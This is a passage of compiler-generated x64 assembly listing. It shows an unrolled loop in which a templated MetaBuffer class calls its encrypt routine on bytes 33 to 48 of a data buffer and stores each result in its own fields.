  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
